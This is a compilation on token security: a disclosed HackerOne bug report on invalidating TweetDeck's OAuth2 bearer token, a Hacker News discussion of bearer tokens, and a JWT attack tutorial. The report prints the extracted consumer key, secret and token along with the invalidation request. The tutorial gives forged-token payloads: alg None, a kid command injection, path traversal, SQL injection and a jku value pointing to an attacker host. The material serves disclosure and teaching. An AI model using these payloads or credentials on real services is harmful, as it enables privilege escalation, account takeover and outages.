
##
#
https://hackerone.com/reports/210779
#
##

[Urgent] Invalidating OAuth2 Bearer token makes TweetDeck unavailable

    Share:

Timeline
filedescriptor
submitted a report to Twitter.
Mar 4th (6 years ago)
First of all, really sorry for the unintentional DoS :( I was testing it with a fresh bearer token but copied the production one accidentally.
Details
I've noticed that TweetDeck is using OAuth2 to issue requests (Authorization Bearer token):
Code 727 BytesWrap lines Copy Download
GET https://api.twitter.com/1.1/help/settings.json?settings_version= HTTP/1.1
Host: api.twitter.com
Connection: keep-alive
Authorization: Bearer AAAAAAAAAAAAAAAAAAAAAF7aAAAAAAAAi95Q2QkUrMfOxflMJIWoZ3JcvJw%3DOLBx5qSvcDbL37ad9Moq9MtZN2yYQ0r6zKtIupfa5AEbVAoZnM
Origin: https://tweetdeck.twitter.com
X-Csrf-Token: 2170b7f455955368495bc191ed67c892
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/plain, */*; q=0.01
X-Twitter-Auth-Type: OAuth2Session
X-Twitter-Client-Version: Twitter-TweetDeck-blackbird-chrome/4.0.170302174617 web/
Referer: https://tweetdeck.twitter.com/
Accept-Encoding: gzip, deflate, sdch, br
Accept-Language: en-US,en;q=0.8
According to the documentation, with a valid consumer key and consumer secret pair, one can generate or invalidate existing bearer token: https://dev.twitter.com/oauth/reference/post/oauth2/invalidate/token
Now, it can be guessed that the hardcoded bearer token used in TweetDeck belongs to the TweetDeck client. The consumer key and consumer secret can be extracted from the desktop application:
Code 99 BytesWrap lines Copy Download
Consumer key:    yT577ApRtZw51q4NPMPPOQ
Consumer secret: 3neq3XqN5fO3obqwZoajavGFCUrC42ZfbrLXy5sCv8
Apparently, anyone can invalidate the bearer token while issuing token invalidation request:
Code 402 BytesWrap lines Copy Download
POST https://api.twitter.com/oauth2/invalidate_token HTTP/1.1
Authorization: Basic eVQ1NzdBcFJ0Wnc1MXE0TlBNUFBPUTozbmVxM1hxTjVmTzNvYnF3Wm9hamF2R0ZDVXJDNDJaZmJyTFh5NXNDdjg=
Host: api.twitter.com
Content-Length: 125
Content-Type: application/x-www-form-urlencoded;charset=UTF-8

access_token=AAAAAAAAAAAAAAAAAAAAAF7aAAAAAAAAi95Q2QkUrMfOxflMJIWoZ3JcvJw%3DOLBx5qSvcDbL37ad9Moq9MtZN2yYQ0r6zKtIupfa5AEbVAoZnM
And suddenly all the requests on TweetDeck result in {"errors":[{"code":89,"message":"Invalid or expired token."}]}.
andrewsorensen
 changed the status to Triaged. 
Mar 4th (6 years ago)
Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.
Thank you for helping keep Twitter secure!
filedescriptor
 posted a comment. 
Updated Mar 4th (6 years ago)
I suspect other services could potential have the same issues. For example mobile.twitter.com is also using the same way to establish API connections. Fix-wise I wonder if forbidding bearer token invalidation on official clients is enough.
andrewsorensen
 posted a comment. 
Mar 4th (6 years ago)
Hi filedescriptor,
Thanks for the information. While we investigate this issue and fix the bearer token for tweetdeck.twitter.com please don't try to revoke any other OAuth bearer tokens until this report has been closed out. We'll take the full impact of this issue into consideration when we award a bounty.
Thanks for thinking of Twitter security!
filedescriptor
 posted a comment. 
Updated Mar 4th (6 years ago)
I stopped all my testings immediately after I realized the consequence so yeah I won't.
andrewsorensen
 posted a comment. 
Mar 4th (6 years ago)
Thanks. We've restored TweetDeck but are still looking into the issue of being able to invalidate the bearer token.
filedescriptor
 posted a comment. 
Updated Mar 6th (6 years ago)
I also noticed mobile Twitter clients depend on a similar way (for the xAuth part) but they generate a new bearer token every time.
According to the documentation: https://dev.twitter.com/oauth/reference/post/oauth2/token

    Only one bearer token may exist outstanding for an application, and repeated requests to this method will yield the same already-existent token until it has been invalidated.

So technically they are always the same until being invalidated (and that explains why I accidentally DoS'd TweetDeck despite using a fresh token which was actually the same as the production one)
Moving on:

    [..] If attempted too frequently, requests will be rejected with a HTTP 403 with code 99

So an attacker could in theory keep creating and invalidating the bearer token for the mobile Twitter clients and achieve DoS there.
PS. Of course I didn't try it.
Twitter  rewarded filedescriptor with a $5,040 bounty. 
Mar 17th (6 years ago)
Thanks again. As mentioned we’ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.
andrewsorensen
 closed the report and changed the status to Resolved. 
Jun 28th (5 years ago)
We consider this issue to be fixed now. Can you please confirm?
Thank you for helping keep Twitter secure!
filedescriptor
 posted a comment. 
Updated Jun 28th (5 years ago)
I'm not sure how to retest it as it might make certain services unavailable again. How do you think I should proceed?
filedescriptor
 posted a comment. 
Jul 4th (5 years ago)
Pinging again
andrewsorensen
 posted a comment. 
Jul 5th (5 years ago)
Understood. We believe this issue is fixed so testing should not have any impact. However, testing with a test application (where possible) instead of a production application would be preferred.
filedescriptor
 posted a comment. 
Updated Jul 5th (5 years ago)
I believe the consumer secret for TweetDeck has been rotated, and other official clients have rejected invalidation requests: {"errors":[{"code":348,"message":"Client application is not permitted to to invalidate this token."}]}. I think it's fixed.
filedescriptor
 requested to disclose this report. 
Jul 5th (5 years ago)
swilson
Twitter staff  posted a comment. 
Jul 7th (5 years ago)
@filedescriptor would like to request we hold off publishing for now. As a part of the clean up after the issue was discovered, we found the scope is larger than just TD. I want to wait and get the remaining updated and then give the all clear to publish if thats ok?
swilson
Twitter staff  reopened this report. 
Jul 7th (5 years ago)
Reopening report as scope is more than just TD. Also re-opened JIRA ticket.
filedescriptor
 posted a comment. 
Jul 7th (5 years ago)
No problem at all
andrewsorensen
 closed the report and changed the status to Resolved. 
Apr 5th (4 years ago)
We consider this issue to be fixed now. Our documentation now clearly calls out the repercussions of having OAuth credentials that are public and how that allows requests to be made on behalf of the application.
Thank you for helping keep Twitter secure!
acamacho
Twitter staff  posted a comment. 
Apr 8th (4 years ago)
@filedescriptor just wanted to checkin with you about the disclosure, did you want to proceed or cancel out the disclosure request? 
filedescriptor
 requested to disclose this report. 
Apr 16th (4 years ago)
Let's disclose it!
acamacho
Twitter staff  agreed to disclose this report. 
Apr 25th (4 years ago)
 This report has been disclosed. 

#
##
##
#


 	
	Bearer tokens are just awful (mjg59.dreamwidth.org)
	85 points by HieronymusBosch 7 months ago | hide | past | favorite | 144 comments


	
	
Sirened 7 months ago | next [–]

Why does the author assume we want to associate a bearer token with hardware at all? When my services issue a JWT, I am issuing a right to talk to my service. If you want to take that token and move it to your phone, neat good for you. If someone steals your laptop and dumps the secret, that's sure as hell not my problem to solve. The application layer is not the appropriate place to apply a mitigation for a user's laptop getting stolen (even if you in theory could).

	
	
mjg59 7 months ago | parent | next [–]

You're free to assert that it's not your issue to solve, and I'm free to assert that I'm not using your service as a result. It is possible to provide equivalent functionality without it being trivial to exfiltrate authentication tokens to other devices, and I can't see any good reasons for refusing to do so.

	
	
Sirened 7 months ago | root | parent | next [–]

Is this a wholehearted departure then from the whole "Simplicity Principle"? Not to be a complete ass, but in your view is there a defensible reason why every single layer of the entire network stack does not guarantee integrity? It would make things more reliable, after all you would still be guaranteed integrity even if TCP is broken! But we don't do that because we acknowledge that maybe we should be solving issues at the poignant location in the stack rather than just haphazardly shoving things in because we need said things in general.

I'm not disagreeing with your underlying point, really. I do agree that authentication is broken in that it fails to provide the actual guarantees we think it does. This is what I was getting at with my point above about issuing a right to talk to my service--that is, in reality, all any practical authentication system can provide today. You simply can't be certain the TPM your service stashed it's keys is secure without forcing attestation (again, problematic). Therefore, as far as your service can assume, your client may have just published the keys for the world to see. This leaves you in no better a theoretical position and it does not solve any of the problems identified with any other auth mechanism purely because it is not fundamentally.

	
	
nannal 7 months ago | root | parent | prev | next [–]

Your expectations might be too high, would you like all applications to monitor if you enter a bad part of town and revoke tokens just in case?

	
	
mjg59 7 months ago | root | parent | next [–]

No, I'd like applications to check with me whether I was ok with the state of my user and their device.

	
	
mooreds 7 months ago | parent | prev | next [–]

I like a good rant as well as the next person, but had some issues with this one.

> What if we have a scenario where a third party authenticates the client (by verifying that they have a valid token issued by their ID provider) and then uses that to issue their own token that's much longer lived?

He might as well be complaining about car keys. Yes, if I leave my car key in the door of my car, bad things will happen. If you issue a long lived bearer token, bad things will happen.

Bearer tokens are credentials. Short lived and limited, but still credentials. You have to take care of credentials!

Use short lived bearer tokens and refresh tokens. Threat model the ramifications of someone stealing the token. If you really higher assurances, look into client bound bearer tokens (DPoP and MTLS in the OAuth world.)

For a common use case (I work for an auth provider, more details in my bio) of browsers or native applications integrating with other applications and APIs, what are other options for verifying a client is authorized to access a resource:

* sessions, probably with cookies. Well known, solid technology. Requires you to either have sticky sessions (so every client request goes to the same server) or a common session store (redis, etc).

* client certificates. If you control all deployment (intranet, employee laptops, etc) can be an option. https://buoyant.io/mtls-guide/ is a good resource if you are doing service to service communication.

* API keys. How do you like your credentials with no internal data structure. Plus, they live forever until you build a rotation system. Yay!

* client bound tokens as mentioned above

I'm not sure what other options are available.

Edit: formatting

	
	
mjg59 7 months ago | root | parent | next [–]

> If you issue a long lived bearer token, bad things will happen.

I can issue a short lived bearer token, and another service I don't control can then decide based on that to issue a long lived one and I have no generic way to gain insight into that.

	
	
mooreds 7 months ago | root | parent | next [–]

Fair, by using bearer tokens you don't have full control over how they are used by downstream parties.

But that's a bit like saying:

I have a metal key that I only give to trusted people, but someone I trust can make a copy of that key and give me back the original. Therefore I can't trust metal keys.

I guess I'd want to dig in a bit more to understand the use case. Who is deciding to use the other service? Who is accepting the long lived token? (you? If so, why? The issuer? Well then, they made that choice.)

	
	
mjg59 7 months ago | root | parent | next [–]

If a metal key that could be duplicated was sufficient for someone to gain access to my company's entire source repository, then yes, I'd say that I shouldn't trust a metal key to be sufficient access control. If that was the best available then I might grudgingly accept it, but in the analogous case here we definitely have something better in the form of hardware-backed asymmetric keys.

Here's an example scenario. One of my users runs Github Desktop and clicks "Sign in". This process involves them performing extra authentication in order to gain access to our enterprise organisation, which is handled by my identity provider. I can hook into that authentication process in order to verify device identity and state, and I can issue a short-lived token. Github will then happily take this short-lived token and provide a long-lived token to the Github Desktop app which will grant access to my organisation's source code without any further authentication, and which is not bound to the device in any way.

	
	
thwayunion 7 months ago | parent | prev | next [–]

> If someone steals your laptop and dumps the secret, that's sure as hell not my problem to solve.

I'm actually curious about the legal situation of stuff like this. Specifically,

1. You issue me a token,

2. that token gets stolen,

3. the stolen token is used to run up a big bill on your service,

4. I refuse to pay that bill (the case being "my laptop was stolen and your service was stolen -- sucks to by both of us, but it's not my obligation to reimburse you for that theft"),

5. You sue me.

What happens? I'm actually genuinely curious, with respect to "stolen services": whose problem is it, really?

What if we insert a new step between 3 and 4 where I tell you the token was stolen, but you choose to accept the token anyways (because eg there wasn't an automated process and the ticket takes a few hours to be resolved)?

(The "you" hear is of course meant to be generic, not Sirened specifically :))

	
	
arcbyte 7 months ago | root | parent | next [–]

Legally it depends on the service that was stolen. Was this a banking or credit website where some consumer protections might apply or do you have any contractual limitations on cost that may protect you?

But generally you will be liable for the costs incurred from items stolen from your custody. You must then recover those costs from whoever stolen from you

	
	
thwayunion 7 months ago | root | parent | next [–]

> Was this a banking or credit website where some consumer protections might apply

Let's assume not.

> or do you have any contractual limitations on cost that may protect you?

I guess in this hypothetical case the person whose laptop was stolen cancels the credit card before the charge is made.

> But generally you will be liable for the costs incurred from items stolen from your custody.

Right... but who was the victim of theft here? The service provider or the client of the service provider?

> You must then recover those costs from whoever stolen from you

So... can the service provider sue you to pay for unauthorized use of your account? Or would that get thrown out and then they would have to go sue the person who actually stole the service?

I think it's clear to me that once the service provide gets cash from the person whose laptop was stolen, it's the problem of the person whose laptop was stolen. But if not, is the problem of the service provider?

	
	
arcbyte 7 months ago | root | parent | next [–]

The short answer is that there are lots of caveats but the service provider will recover the bill from you.

If you refuse to pay and they sue you then they will win and a court will force you to pay, even if it means a sheriff comes to your house and takes your things to sell at a public auction to come up with the money.

You will have to recover from the thief if you want to be made whole. It's possible that if you know who the thief is and can serve them, you can join them to the suit the provider brings against you. Then the court will adjudicate the whole thing together and the thief will directly pay the provider. But that still starts with suing you and action on your part to find and sue the thief.

	
	
thwayunion 7 months ago | root | parent | next [–]

Interesting. Thanks!

	
	
saagarjha 7 months ago | parent | prev | next [–]

I get the feeling that the author is speaking from the context of corporate zero trust, where they would like certain policies enforced on an endpoint before it is allowed to access a service, and thus transferring the token to an unmanaged device is considered a problem.

	
	
zshrdlu 7 months ago | parent | prev | next [–]

Sounds to me like the author is essentially bemoaning a presumed lack of an invalidation mechanism, and thus declares "Bearer tokens considered harmful".

	
	
rstuart4133 7 months ago | root | parent | next [–]

I don't think so. He is bemoaning the lack of mutual authentication. Once the token is handed out the server has no guarantee on later uses it's dealing with the thing it's handed to, and in some ways worse on later uses the user has no guarantee it's dealing with the server than gave it to him.

Bearer tokens are no different to a password in that way. Netflix is currently battling shared passwords, and people regularly have their passwords stolen by a site impersonating the other end.

Invalidation is only useful if you know the bearer token has been stolen or compromised so it doesn't solve them problem. It's no different to demanding your users change their passwords after a leak has been publicised. And besides - it's already possible to keep a registry of invalid tokens, just a it's possible to set a "password must be changed at next login" flag, so invalidation is possible now.

But - the article seems to totally ignore the improvement short lived tokens makes to the situation. If the token only live for 15 minutes, the damage it can do is presumably limited. Still, the point remains - if you could replace a bearer token with something that did mutual authentication on every exchange it be much more secure.

Conceptually, it's not even that difficult. IPSec effectively does it now for every packet sent. You "just" need to build IPSec like mechanisms into every exchange. Actually it's not that hard - with a standardised protocol app developers could use it without much change. But there doesn't appear to be much movement in that direction.

Somewhat harder is "mutually authenticate with what". If the threat model is "someone hacks your computer, and steals the credentials", then it has to be tied to something unhackable that needs to be physically stolen to get any improvement. IPSec doesn't address the problem. Sure, you can authenticate against a certificate, but unless someone has going to the trouble of using a HSM that certificate is really just another long lived bearer token that can be stolen.

That can be fixed. One can imagine a person using a FIDO2 key to authenticate themselves, but all the FIDO2 key does is authorised the TPM in their device to act on their behalf for a while, and the TPM establishes a trust relationship with the servers HSM and somehow tying that all together so every packet exchanges is authenticated with that trust relationship. But now we are talking real complex multilayer protocols.

Such protocols would be far better than what we have now security wise, but it's a huge job. If mjg59 wants that world he would probably be better off doing some social engineering and collecting together a group to write a spec everyone can stomach, not whining about it on the internet.

	
	
zshrdlu 7 months ago | root | parent | next [–]

The device can be snatched along with the FIDO2 key...

	
	
vladvasiliu 6 months ago | root | parent | next [–]

Some years ago there were some guys who implemented FIDO2 on an iPhone (Krypt.co, now bought by Akamai).

Sure, people could steal your phone at the same time they steal your laptop. But it's still somewhat less likely, since the phone isn't designed to be plugged in 24/7 in your laptop's USB port, unlike the YubiKey Nano, for example.

	
	
michael1999 7 months ago | parent | prev | next [–]

Who says authentication needs to stay at the app layer?

	
	
ThePhysicist 7 months ago | prev | next [–]

I think the article mixes up several different problems. Both cryptographic keys and opaque tokens are "possession factors", i.e. if you have them you can authenticate against a service. Signature-based authentication schemes are mostly used to protect against replay attacks, which are easy to perform with an opaque token as it won't change.

That said you can tie both opaque and cryptographic tokens to additional factors. For example, machine tokens can be tied to specific IP addresses, so an adversary won't be able to use them from a different device. Tying them to other possession factors like TOTP codes would also work, though it's often impractical.

Mobile apps can easily make use of signature-based authentication schemes based on keys stored in a secure enclave, both Apple and Android phones have good support for that. For web apps it's more complicated as there's no way to store keys in an enclave (and many older laptops/computers don't even have TPMs), so you keep them lying around in memory or in the browsers' session/local storage, which of course isn't ideal.

	
	
fragile_frogs 7 months ago | parent | next [–]

You can actually securely store a key pair inside of indexeddb by setting extractable to false [1]. You can then get a reference to the key and perform your allowed key usages without JS touching the key.

[1] https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypt...

	
	
iso1631 7 months ago | prev | next [–]

So don't set the token to expire after the "heat death of the universe", make the user reauthenticate after an appropriate time for the service being used.

	
	
jillesvangurp 7 months ago | parent | next [–]

Exactly, all of the reasons bearer tokens might be awful are essentially self inflicted pain. Simple suggestion: don't do that and do it right instead. It's an opaque blob, by design. Which means it could be anything. Including something bearing useful information that you can verify in a sane way.

In our case, we use JWT tokens that contain a few claims, are signed, have an expiration token, etc. Not awful at all. Verifiable information, signed by us with our private key, exchanged over https. That's not information the bearer of the token needs to be aware of but it is something our APIs can trivially verify and use as a basis for authenticating the bearer of the token. Pretty neat mechanism. Nothing wrong with it. Used at scale by world + dog on the internet without a lot of issues.

And before somebody starts ranting about JWTs being awful: same argument. They don't have to be but they can might if you decline to use sane crypto. So, use it properly and you're fine. It's not that hard. 


#
##
#


The JWT format

A JSON Web Token consists of a header, payload, and signature in base64url encoding, separated by dots, as follows:

HEADER.PAYLOAD.SIGNATURE

Let’s take apart the following real token:

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJuYW1lIjoiSm9obiBEb2UiLCJ1c2VyX25hbWUiOiJqb2huLmRvZSIsImlzX2FkbWluIjpmYWxzZX0.
fSppjHFaqlNcpK1Q8VudRD84YIuhqFfA67XkLam0_aY

The header contains metadata about the token, such as the algorithm used for the signature and the type of the token (which is simply JWT). For this example, the header before encoding is:

{
  "alg": "HS256",
  "typ": "JWT"
}

The payload contains information (claims) about the entity (user) that is going to be verified by the application. Our sample token includes the following claims:

{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": false
}

Finally, to generate the signature, we have to apply base64url encoding to the header, dot, and payload, and then sign the whole thing using a secret (for symmetric encryption) or a private key (for asymmetric encryption), depending on the algorithm specified in the header. We’ve put HS256 in the header, which is a symmetric algorithm, so the encoding and signing operation would be:

HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)

This gives us the following signature, which is then appended (after a dot) to the base64url-encoded header and payload:

fSppjHFaqlNcpK1Q8VudRD84YIuhqFfA67XkLam0_aY

Common JWT vulnerabilities

JSON Web Tokens were designed to be flexible and future-proof, leaving a lot of room for adaptation to a variety of use cases and requirements – but also a lot of room for mistakes in implementation and use. Here are some typical vulnerabilities that can be introduced when working with JWTs.
Failing to verify the signature

Many JWT libraries provide one method to decode the token and another to verify it:

    decode(): Only decodes the token from base64url encoding without verifying the signature.
    verify(): Decodes the token and verifies the signature.

Sometimes developers might mix up these methods. In that case, the signature is never verified and the application will accept any token (in a valid format). Developers might also disable signature verification for testing and then forget to re-enable it. Such mistakes could lead to arbitrary account access or privilege escalation.

For example, let’s say we have the following valid token that is never actually verified:

{
  "alg": "HS256",
  "typ": "JWT"
}.
{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": false
}

An attacker could send the following token with an arbitrary signature to obtain escalated privileges:

{
  "alg": "HS256",
  "typ": "JWT"
}.
{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": true
}

Allowing the None algorithm

The JWT standard accepts many different types of algorithms to generate a signature:

    RSA
    HMAC
    Elliptic Curve 
    None

The None algorithm specifies that the token is not signed. If this algorithm is permitted, we can bypass signature checking by changing an existing algorithm to None and stripping the signature. Let’s start with our expected token:

{
  "alg": "HS256",
  "typ": "JWT" 
}.
{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": false
}.SIGNATURE

Encoded and signed, the token will look like this (signature in bold):

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJuYW1lIjoiSm9obiBEb2UiLCJ1c2VyX25hbWUiOiJqb2huLmRvZSIsImlzX2FkbWluIjpmYWxzZX0.
fSppjHFaqlNcpK1Q8VudRD84YIuhqFfA67XkLam0_aY

If None is permitted as the algorithm value, an attacker can simply use it to replace the valid algorithm and then get rid of the signature:

{
  "alg": "None",
  "typ": "JWT"
}.
{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": true
}.

Though now unsigned, the modified token will be accepted by the application:

eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.
eyJuYW1lIjoiSm9obiBEb2UiLCJ1c2VyX25hbWUiOiJqb2huLmRvZSIsImlzX2FkbWluIjp0cnVlfQ.

That is why it is important to not accept tokens with None, none, NONE, nOnE, or any other case variations in the alg header.
Algorithm confusion

JWT accepts both symmetric and asymmetric encryption algorithms. Depending on the encryption type, you need to use either a shared secret or a public-private key pair:

Algorithm
	

Key used to sign
	

Key used to verify

Asymmetric (RSA)
	

Private key
	

Public key

Symmetric (HMAC)
	

Shared secret
	

Shared secret

When an application uses asymmetric encryption, it can openly publish its public key and keep the private key secret. This allows the application to sign tokens using its private key and anyone can verify this token using its public key. The algorithm confusion vulnerability arises when an application does not check whether the algorithm of the received token matches the expected algorithm.

In many JWT libraries, the method to verify the signature is:

    verify(token, secret) – if the token is signed with HMAC
    verify(token, publicKey) – if the token is signed with RSA or similar

Unfortunately, in some libraries, this method by itself does not check whether the received token is signed using the application’s expected algorithm. That’s why in the case of HMAC this method will treat the second argument as a shared secret and in the case of RSA as a public key.

If the public key is accessible within the application, an attacker can forge malicious tokens by:

    Changing the algorithm of the token to HMAC
    Tampering with the payload to get the desired outcome
    Signing the malicious token with the public key found in the application
    Sending the JWT back to the application

The application expects RSA encryption, so when an attacker supplies HMAC instead, the verify() method will treat the public key as an HMAC shared secret and use symmetric rather than asymmetric encryption. This means that the token will be signed using the application’s non-secret public key and then verified using the same public key.

To avoid this vulnerability, applications must check if the algorithm of the received token is the expected one before they pass the token to the verify() method.
Using trivial secrets

With symmetric encryption, a cryptographic signature is only as strong as the secret used. If an application uses a weak secret, the attacker can simply brute-force it by trying different secret values until the original signature matches the forged one. Having discovered the secret, the attacker can use it to generate valid signatures for malicious tokens. To avoid this vulnerability, strong secrets must always be used with symmetric encryption.
Attacks against JSON Web Tokens
kid parameter injections

The JWT header can contain the Key Id parameter kid. It is often used to retrieve the key from a database or filesystem. The application verifies the signature using the key obtained through the kid parameter. If the parameter is injectable, it can open the way to signature bypass or even attacks such as RCE, SQLi, and LFI.

To see this in action, let’s start with the following valid token:

{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1"
}.
{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": false
}

If the kid parameter is vulnerable to command injection, the following modification might lead to remote code execution:

{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1|/usr/bin/uname"
}.
{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": false
}

kid parameter injection + directory traversal = signature bypass

If an application uses the kid parameter to retrieve the key from the filesystem, it might be vulnerable to directory traversal. Then an attacker can force the application to use a file whose value the attacker can predict as a key for verification. This can be done using any static file within the application. Knowing the key file value, the attacker can craft a malicious token and sign it using the known key.

Continuing with the previous JWT example, an attacker might try to insert /dev/null as the key source to force the application to use an empty key:

{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../dev/null"
}.
{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": true
}

If directory traversal to /dev/null succeeds, the attacker will be able to sign a malicious token using an empty string. The same technique can be used with known static files, for example CSS files.
kid parameter injection + SQL injection = signature bypass

If an application uses the kid parameter to retrieve the key from a database, it might be vulnerable to SQL injection. If successful, an attacker can control the value returned to the kid parameter from an SQL query and use it to sign a malicious token.

Again using the same example token, let’s say the application uses the following vulnerable SQL query to get its JWT key via the kid parameter:

SELECT key FROM keys WHERE key='key1'

An attacker can then inject a UNION SELECT statement into the kid parameter to control the key value:

{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "xxxx' UNION SELECT 'aaa"
}.
{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": true
}

If SQL injection succeeds, the application will use the following query to retrieve the signature key:

SELECT key FROM keys WHERE key='xxxx' UNION SELECT 'aaa'

This query returns aaa into the kid parameter, allowing the attacker to sign a malicious token simply with aaa. 

To avoid these and other injection attacks, applications should always sanitize the value of the kid parameter before using it.
Attacks using the jku header

In the JWT header, developers can also use the jku parameter to specify the JSON Web Key Set URL. This parameter indicates where the application can find the JSON Web Key (JWK) used to verify the signature – basically the public key in JSON format.

To illustrate, let’s take the following JWT that uses the jku parameter to specify the public key:

{
  "alg": "RS256",
  "typ": "JWT",
  "jku":"https://example.com/key.json"
}.
{
  "name": "John Doe",
  "user_name": "john.doe",
  "is_admin": false
}

The specified key.json file might look something like:

{
  "kty": "RSA",
  "n": "-4KIwb83vQMH0YrzE44HppWvyNYmyuznuZPKWFt3e0xmdi-WcgiQZ1TC...RMxYC9lr4ZDp-M0",
  "e": "AQAB"
}

The application verifies the signature using the JSON Web Key retrieved based on the jku header value:
JSON Web Token verification using a legitimate JKU

Now for the attack. An attacker can change the jku parameter value to point to their own JWK instead of the valid one. If accepted, this allows the attacker to sign malicious tokens using their own private key. After the malicious token is sent, the application will fetch the attacker’s JWK and use it to verify the signature:
JSON Web Token verification using a malicious JKU

To prevent such attacks, applications typically use URL filtering. Unfortunately, there are ways for attackers to bypass such filtering, including:

    Using https://trusted (for example https://trusted@attacker.com/key.json), if the application checks for URLs starting with trusted
    Using URL fragments with the # character
    Using the DNS naming hierarchy
    Chaining with an open redirect
    Chaining with a header Injection
    Chaining with SSRF

For this reason, it is very important for the application to whitelist permitted hosts and have correct URL filtering in place. Beyond that, the application must not have other vulnerabilities that an attacker might chain to bypass URL filtering.

